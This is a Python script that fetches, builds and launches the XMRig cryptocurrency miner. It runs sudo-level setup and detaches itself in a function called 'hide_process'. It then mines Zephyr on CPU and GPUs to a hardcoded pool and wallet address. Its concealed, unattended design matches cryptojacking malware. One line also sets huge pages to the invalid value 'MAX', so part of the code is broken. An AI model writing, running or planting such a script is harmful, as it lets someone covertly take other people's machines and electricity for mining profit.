import os
import subprocess

def install_dependencies():
	subprocess.call("sudo apt-get update", shell=True)
	subprocess.call("sudo apt-get install -y build-essential cmake libuv1-dev libssl-dev libhwloc-dev", shell=True)

def install_xmrig():
	# Clone repository
	subprocess.run(["git", "clone", "https://github.com/xmrig/xmrig.git"])
	# Build xmrig
	os.chdir("xmrig")
	subprocess.run(["mkdir", "build"])
	os.chdir("build")
	subprocess.run(["cmake", ".."])
	subprocess.run(["make"])

def set_huge_pages():
	# Set huge pages
	subprocess.run(["sudo", "sysctl", "-w", "vm.nr_hugepages=MAX"])

def start_xmrig():
	# Start xmrig
	os.chdir("../..")
	subprocess.Popen(["./xmrig/build/xmrig", "--url=stratum+ssl://sg-zephyr.miningocean.org:5432", "--user=ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB", "--coin=Zephyr", "--cpu", "--cuda", "--opencl"])

def hide_process():
	# Hide process
	pid = os.fork()
	if pid > 0:
		exit()
	elif pid == 0:
		os.setsid()
	else:
		exit()

def main():
	install_dependencies()
	install_xmrig()
	set_huge_pages()
	hide_process()
	start_xmrig()

if __name__ == "__main__":
	main()
